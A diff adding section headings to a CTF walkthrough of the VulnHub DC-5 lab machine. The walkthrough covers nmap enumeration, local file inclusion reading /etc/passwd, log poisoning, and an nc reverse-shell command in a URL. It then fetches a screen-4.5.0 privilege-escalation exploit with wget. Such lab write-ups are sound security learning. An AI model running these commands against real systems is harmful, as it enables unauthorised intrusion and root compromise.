@@ -2,6 +2,7 @@
 [VulnHub link](https://www.vulnhub.com/entry/dc-5,314/)  
 By DCAU
 
+## Enumeration ##
 * As with the first 4 iterations of the DC-series, we are first greeted with a login page that requires users to specify both the username and the password:
 ![](/screenshots/dc-5/loginInitial.jpg)
 * Common login credentials such as `admin:admin` and `admin:password` do not work.
@@ -12,6 +13,8 @@ By DCAU
 * Run `nmap -p- -A 10.0.2.12`:
 ![](/screenshots/dc-5/hostFullScan.jpg)
 * Looking at the services which the vulnerable VM is running, we can see an nginx web server running on port 80 (which is open), as with the previous iteration of the dc series.
+
+## Exploring Nginx Service on Port 80 ##
 * Opening `http://10.0.2.12` reveals a site with paragraphs of random sample texts greeting us:
 ![](/screenshots/dc-5/siteWebServer.jpg)
 * At this point in time, I could not be more stuck. I tried using Burp Suite on the Contact form as was done in the previous walkthrough for DC-4, but to no avail.
@@ -23,6 +26,8 @@ By DCAU
 ![](/screenshots/dc-5/contactFormSubmitPageSource.jpg)
 * While I understood that we could modify the data (within the various options) being sent, what I did not know was that we could attempt our own options as well. Such an option would be `file`, where we would want to read the contents of specific files within the web server. It turns out that this vulnerability is called **Local File Inclusion** (LFI).
 * Here is a [great explanation](https://roguecod3r.wordpress.com/2014/03/17/lfi-to-shell-exploiting-apache-access-log/) on how we will be exploiting this vulnerability to get our shell, courtesy of roguecod3r (author of post) and byzo (who suggested this article in his walkthrough).
+
+## Exploring LFI ##
 * After understanding this, we will now attempt to get the contents of `/etc/passwd`, by entering `http://10.0.2.12/thankyou.php?file=/etc/passwd`:
 ![](/screenshots/dc-5/etcPasswdFile.jpg)
 * Interestingly, if we did not include any file to load in the parameter, the footer contents would disappear, i.e. no Copyright © 2019 would be retrieved.
@@ -47,6 +52,8 @@ By DCAU
 ![](/screenshots/dc-5/commandExecutionAccessLogs.jpg)
 * Note: Visiting the page with the parameter `cmd=id` immediately after sending the GET request via netcat will result in the output of `id` being displayed as the latest one. I visited a few pages in between for the example above to illustrate my point that the output of the command will only appear exactly where the netcat GET request was made.
 ![](/screenshots/dc-5/commandExecutionImmediateAccessLogs.jpg)
+
+## Gaining Reverse Shell (from LFI) ##
 * Next, we will establish our shell to the web server by running a netcat listener `nc -v -l -p 1234` on our Kali VM terminal, and then visiting `http://10.0.2.12/thankyou.php?file=/var/log/nginx/access.log&cmd=nc 10.0.2.15 1234 -c /bin/sh` on our browser:
 ![](/screenshots/dc-5/ncEstablishShell.jpg)
 * Note: Replace `10.0.2.15` with the IP address of your Kali VM, `1234` with a port number of your choice just for the purpose of establishing this connection, and `/bin/sh` with `/bin/bash` if you would like (there is no difference between the 2 here).
@@ -55,6 +62,8 @@ By DCAU
 * Next, run `find / -user root -perm -4000 -print 2>/dev/null` to search for setuid binaries which we can possibly exploit:
 ![](/screenshots/dc-5/setuidBinaries.jpg)
 * Having executed this `find` command many times over our past challenges, we are more or less able to distinguish if there are any unusual binaries in the output. Here, it is `/bin/screen-4.5.0`.
+
+## Privilege Escalation (to root) ##
 * Googling about /bin/screen-4.5.0 led me to find out about the existence of 2 exploits relating to it on Exploit DB - [41152](https://www.exploit-db.com/exploits/41152) and [41154](https://www.exploit-db.com/exploits/41154). I could not quite understand the former, so we will use the latter.
 * To upload the exploit script, run `python -m SimpleHTTPServer 4567` on our Kali VM, then navigate to `/tmp` on our netcat shell before running `wget http://10.0.2.15:4567/41154.sh`:
 ![](/screenshots/dc-5/uploadExploitScript.jpg)
